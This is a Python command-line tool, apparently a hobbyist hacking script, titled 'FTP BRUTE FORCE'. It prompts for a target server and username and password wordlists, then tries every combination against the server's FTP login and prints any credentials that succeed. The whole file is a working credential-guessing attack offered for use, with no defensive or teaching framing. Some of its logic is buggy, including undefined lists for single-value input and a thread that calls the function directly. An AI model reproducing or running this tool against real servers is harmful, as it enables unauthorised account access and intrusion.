import os
import sys
import time
import platform
import threading

# check os

def check_os():
    return platform.system()

# clear screen

def clear():
    if check_os() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

# Program Banner

def banner():
    clear()
    try:
        import pyfiglet
        from pyfiglet import Figlet
    except ImportError as err:
        print("\033[1;31m %s \n" % err)
        print("[+] Installing Module...\n\033[0m")
        if check_os() == "Windows":
            os.system("pip install pyfiglet")
        else:
            os.system("sudo pip3 install pyfiglet")

    f = Figlet(font="small")
    print("\033[1;32m")
    print(f.renderText("FTP BRUTE FORCE"))
    print("\t\t>>>> Coded by NightOwl <<<< \n\033[0m")

# exit program
def exit_func():
    exit_question = str(input("\n\033[1;32m[+] Do you wanna quit ( y/ n) --> \033[0m"))
    if(exit_question == "y" or exit_question == "Y"):
        print("\n\033[1;32m[+] Exiting...\n")
        print("[", end="", flush=True)
        for time_count in range(0,6):
            time.sleep(0.6)
            print("#", end="",flush=True)
        print("]\n\033[0m")
        sys.exit(0)
    elif(exit_question == "n" or exit_question == "N"):
        target_inf()

# Target Information Get
def target_inf():
    banner()
    try:
        server_addr = str(input("\033[1;32m[?] Target Address => \033[0m"))
        Search_Ftp(server_addr)
    except KeyboardInterrupt:
        exit_func()

# Search FTP Server
def Search_Ftp(server_addr):
    import ftplib
    try:
        ftp = ftplib.FTP(server_addr)
        print("\n\033[1;32m[+] Server Avaible...\n\033[0m")
        server_user(server_addr)
    except ftplib.socket.error as err:
        print(err)


def server_user(server_addr):
    try:
        username = str(input("[+] Username (Username List Or Only Username) -> "))
        password = str(input("[+] Password (Password List Or Only Password) -> "))
        username_split = username.split(".")
        password_split = password.split(".")
        if username_split[1] == "txt":
            username_file = open(username,"rb")
            username_list = []
            for username_file_read in username_file:
                username_list.append(username_file_read)
        if password_split[1] == "txt":
            password_file = open(password,"rb")
            password_list = []
            for password_file_read in password_file:
                password_list.append(password_file_read)
      
     
        start_attack = threading.Thread(target= Brute_Force_Attack(server_addr,username_list, password_list, len(username_list), len(password_list)))
        start_attack.start()
      



    except KeyboardInterrupt:
        exit_func()
    

def Brute_Force_Attack(server_addr,username, password, username_length, password_length):
    username_list = []
    password_list = []

    for username_list_append in username:
        username_list.append(username_list_append)

    for password_list_append in password:
        password_list.append(password_list_append)
    
    import ftplib
    for username_run in username_list:
        for password_run in password_list:
            
            print("Username: ", bytes(username_run).decode("utf-8").split("\n")[0])
            print("Password: ", bytes(password_run).decode("utf-8").split("\n")[0])
            ftp = ftplib.FTP(server_addr)
            try:
                result = ftp.login(user= bytes(username_run).decode("utf-8").split("\n")[0], passwd=bytes(password_run).decode("utf-8").split("\n")[0])
            except ftplib.error_perm:
                pass
            else:
                print("""\033[1;32m
                ____________________________
                |                          |
                |          FOUND           |
                |__________________________|
                """)
                print("\033[1;32mUsername : %s \033[0m" %bytes(username_run).decode("utf-8").split("\n")[0])
                print("\033[1;32mPassword : %s \033[0m"%  bytes(password_run).decode("utf-8").split("\n")[0])
                break
          
                

    
    


if __name__ == '__main__':
    target_inf()
